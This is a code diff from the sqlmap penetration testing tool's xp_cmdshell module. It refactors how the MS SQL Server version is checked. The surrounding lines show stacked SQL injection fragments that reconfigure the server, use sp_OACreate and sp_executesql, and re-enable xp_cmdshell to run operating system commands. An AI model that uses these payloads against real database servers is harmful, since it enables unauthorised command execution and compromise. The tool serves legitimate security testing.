@@ -7,6 +7,7 @@ Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
 See the file 'doc/COPYING' for copying permission
 """
 
+from lib.core.common import backend
 from lib.core.common import randomStr
 from lib.core.common import readInput
 from lib.core.common import wasLastRequestDelayed
@@ -29,7 +30,7 @@ class xp_cmdshell:
     def __xpCmdshellCreate(self):
         cmd = ""
 
-        if kb.dbmsVersion[0] in ( "2005", "2008" ):
+        if backend.isVersionWithin(("2005", "2008")):
             logger.debug("activating sp_OACreate")
 
             cmd += "EXEC master..sp_configure 'show advanced options', 1; "
@@ -48,7 +49,7 @@ class xp_cmdshell:
         cmd += "EXEC sp_OADestroy @ID'; "
         cmd += "EXEC master..sp_executesql @%s;" % self.__randStr
 
-        if kb.dbmsVersion[0] in ( "2005", "2008" ):
+        if backend.isVersionWithin(("2005", "2008")):
             cmd += " RECONFIGURE WITH OVERRIDE;"
 
         inject.goStacked(cmd)
@@ -80,7 +81,7 @@ class xp_cmdshell:
         return cmd
 
     def __xpCmdshellConfigure(self, mode):
-        if kb.dbmsVersion[0] in ( "2005", "2008" ):
+        if backend.isVersionWithin(("2005", "2008")):
             cmd = self.__xpCmdshellConfigure2005(mode)
         else:
             cmd = self.__xpCmdshellConfigure2000(mode)
